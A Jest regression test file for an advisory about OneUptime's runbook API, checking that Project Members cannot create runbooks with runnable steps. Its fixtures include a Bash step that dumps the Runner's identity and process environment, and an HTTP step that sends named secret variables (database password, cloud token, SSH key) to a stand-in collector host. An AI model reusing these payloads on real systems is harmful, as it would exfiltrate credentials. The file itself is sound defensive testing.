jest.mock("../../../Server/Utils/Logger", () => {
  return {
    __esModule: true,
    default: {
      debug: jest.fn(),
      info: jest.fn(),
      warn: jest.fn(),
      error: jest.fn(),
      getLogLevel: jest.fn().mockReturnValue("INFO"),
    },
    getLogAttributesFromRequest: jest.fn().mockReturnValue({}),
  };
});

import BaseAPI from "../../../Server/API/BaseAPI";
import CommonAPI from "../../../Server/API/CommonAPI";
import DatabaseService from "../../../Server/Services/DatabaseService";
import RunbookLabelRuleEngineService from "../../../Server/Services/RunbookLabelRuleEngineService";
import RunbookOwnerRuleEngineService from "../../../Server/Services/RunbookOwnerRuleEngineService";
import RunbookService from "../../../Server/Services/RunbookService";
import Runbook from "../../../Models/DatabaseModels/Runbook";
import BaseModel from "../../../Models/DatabaseModels/DatabaseBaseModel/DatabaseBaseModel";
import DatabaseCommonInteractionProps from "../../../Types/BaseDatabase/DatabaseCommonInteractionProps";
import { JSONObject } from "../../../Types/JSON";
import ObjectID from "../../../Types/ObjectID";
import Permission from "../../../Types/Permission";
import { getStepsThatRunRefusal } from "../../../Types/Runbook/RunbookStepAuthoring";
import RunbookStepType from "../../../Types/Runbook/RunbookStepType";
import { customDomainCaller } from "./CustomDomainCallers";
import DashboardRequestsOverHttp, {
  SentRequest,
} from "../TestingUtils/DashboardRequestsOverHttp";
import {
  InMemoryTable,
  useInMemoryTable,
} from "../TestingUtils/InMemoryRepository";
import { stubProjectDirectory } from "../TestingUtils/ProjectDirectory";
import { ON_HIGHEST_PLAN } from "../TestingUtils/RequestPlan";
import { getJestSpyOn } from "../../Spy";
import {
  afterAll,
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  jest,
  test,
} from "@jest/globals";

/*
 * WHO WRITES A RUNBOOK'S STEPS THAT RUN, THROUGH THE API
 * (GHSA-rfrx-38rq-44w6).
 *
 * The report: a Project Member POSTs /api/runbook with a Bash step and runs
 * it. Project Member runs runbooks and may not change their steps - the
 * Steps page saves with an update it is refused - but the create took steps
 * from everyone on the table's create list, so the member wrote a step that
 * ran on the project's Runner, or an HTTP request step OneUptime sent with
 * every secret runbook variable it named, to an address of its own.
 *
 * Through Express, BaseAPI, the permission layer, RunbookService's hooks and
 * a table in memory:
 *
 *   - that create is refused, from a person or an API key, with the words
 *     that say who may write such a step, and nothing is written;
 *   - a Runbook Admin, and Create Runbook with Edit Runbook, create it as
 *     before;
 *   - a Project Member still creates a runbook of manual steps, or with no
 *     steps, as the Runbooks page and the runbook templates do.
 */

const PROJECT_ID: ObjectID = new ObjectID(
  "1f5f0000-0000-4000-8000-000000000002",
);
const RUNNER_ID: string = "1f5f0000-0000-4000-8000-0000000000cc";

function caller(
  permissions: Array<Permission>,
  isApiKey: boolean = false,
): DatabaseCommonInteractionProps {
  return {
    ...customDomainCaller({
      permissions: permissions,
      projectId: PROJECT_ID,
      isApiKey: isApiKey,
    }),
    ...ON_HIGHEST_PLAN,
  };
}

// The report's step: the Runner's identity and environment, printed back.
const BASH_STEP: JSONObject = {
  id: "s1",
  order: 0,
  type: RunbookStepType.Bash,
  title: "poc",
  config: {
    script: 'id; hostname; cat /proc/self/environ | tr "\\0" "\\n"',
    agentId: RUNNER_ID,
  },
};

// No Runner needed: OneUptime sends it, with the secrets it names filled in.
const HTTP_STEP_SENDING_SECRETS: JSONObject = {
  id: "s2",
  order: 1,
  type: RunbookStepType.HttpRequest,
  title: "Send the secrets away",
  config: {
    url: "https://collector.example/c?k={{global.variables.PROD_DB_PASSWORD}}",
    method: "POST",
    headersJson: '{"X-Token": "{{global.variables.CLOUD_API_TOKEN}}"}',
    body: "{{global.variables.DEPLOY_SSH_KEY}}",
  },
};

const MANUAL_STEP: JSONObject = {
  id: "m1",
  order: 0,
  type: RunbookStepType.Manual,
  title: "Check the disk",
  description: "Look at the disk graph before you clean anything up.",
  config: {},
};

const REFUSAL: string = getStepsThatRunRefusal([
  "Project Owner",
  "Project Admin",
  "Edit Runbook",
  "Runbook Admin",
]);

let server: DashboardRequestsOverHttp;
let runbooks: InMemoryTable;
let props: DatabaseCommonInteractionProps;

async function create(steps?: Array<JSONObject>): Promise<SentRequest> {
  return await server.request("POST", "/api/runbook", {
    data: {
      name: "poc",
      projectId: PROJECT_ID.toString(),
      ...(steps ? { steps } : {}),
    },
  });
}

// The words of a refusal, as the server answers them.
function refusalOf(sent: SentRequest): string {
  const answer: JSONObject = (sent.answer || {}) as JSONObject;
  return String(answer["error"] || answer["message"] || "");
}

beforeAll(async () => {
  server = new DashboardRequestsOverHttp();
  await server.start([
    new BaseAPI<Runbook, DatabaseService<BaseModel>>(
      Runbook,
      RunbookService as unknown as DatabaseService<BaseModel>,
    ).getRouter(),
  ]);
});

afterAll(async () => {
  await server.stop();
});

beforeEach(() => {
  server.requests.length = 0;
  stubProjectDirectory({});

  jest
    .spyOn(CommonAPI, "getDatabaseCommonInteractionProps")
    .mockImplementation(async (): Promise<DatabaseCommonInteractionProps> => {
      return { ...props };
    });

  getJestSpyOn(
    RunbookLabelRuleEngineService,
    "applyRulesToRunbook",
  ).mockResolvedValue(undefined);
  getJestSpyOn(
    RunbookOwnerRuleEngineService,
    "applyRulesToRunbook",
  ).mockResolvedValue(undefined);

  runbooks = useInMemoryTable(RunbookService, []);
});

afterEach(() => {
  jest.restoreAllMocks();
});

describe("POST /api/runbook with steps that run", () => {
  test.each([
    ["a Project Member", caller([Permission.ProjectMember])],
    ["a Project Member's API key", caller([Permission.ProjectMember], true)],
    [
      "Create Runbook alone",
      caller([Permission.CreateRunbook, Permission.ReadRunbook]),
    ],
  ])(
    "from %s, with the report's Bash step, is refused and nothing is written",
    async (_who: string, as: DatabaseCommonInteractionProps) => {
      props = as;

      const sent: SentRequest = await create([BASH_STEP]);

      expect({ status: sent.status, refusal: refusalOf(sent) }).toEqual({
        status: 422,
        refusal: REFUSAL,
      });
      expect(runbooks.inserts).toEqual([]);
      expect(runbooks.rows).toEqual([]);
    },
  );

  test("from a Project Member, with an HTTP request step that names the project's secrets, is refused and nothing is written", async () => {
    props = caller([Permission.ProjectMember]);

    const sent: SentRequest = await create([
      MANUAL_STEP,
      HTTP_STEP_SENDING_SECRETS,
    ]);

    expect(sent.status).toBe(422);
    expect(refusalOf(sent)).toBe(REFUSAL);
    expect(runbooks.inserts).toEqual([]);
  });

  test.each([
    ["a Runbook Admin", caller([Permission.RunbookAdmin])],
    ["a Runbook Admin's API key", caller([Permission.RunbookAdmin], true)],
    [
      "Create Runbook with Edit Runbook",
      caller([
        Permission.CreateRunbook,
        Permission.EditRunbook,
        Permission.ReadRunbook,
      ]),
    ],
  ])(
    "from %s is created with its steps as they were sent",
    async (_who: string, as: DatabaseCommonInteractionProps) => {
      props = as;

      const sent: SentRequest = await create([
        BASH_STEP,
        HTTP_STEP_SENDING_SECRETS,
      ]);

      expect({ status: sent.status, refusal: refusalOf(sent) }).toEqual({
        status: 200,
        refusal: "",
      });
      expect(runbooks.rows).toHaveLength(1);
      expect(runbooks.rows[0]!["steps"]).toEqual([
        BASH_STEP,
        HTTP_STEP_SENDING_SECRETS,
      ]);
    },
  );
});

describe("POST /api/runbook from a Project Member, with nothing that runs", () => {
  test.each([
    ["manual steps", [MANUAL_STEP]],
    ["no steps", []],
    ["steps left out", undefined],
  ])(
    "is created with %s",
    async (_what: string, steps: Array<JSONObject> | undefined) => {
      props = caller([Permission.ProjectMember]);

      const sent: SentRequest = await create(steps);

      expect({ status: sent.status, refusal: refusalOf(sent) }).toEqual({
        status: 200,
        refusal: "",
      });
      expect(runbooks.rows).toHaveLength(1);
    },
  );
});
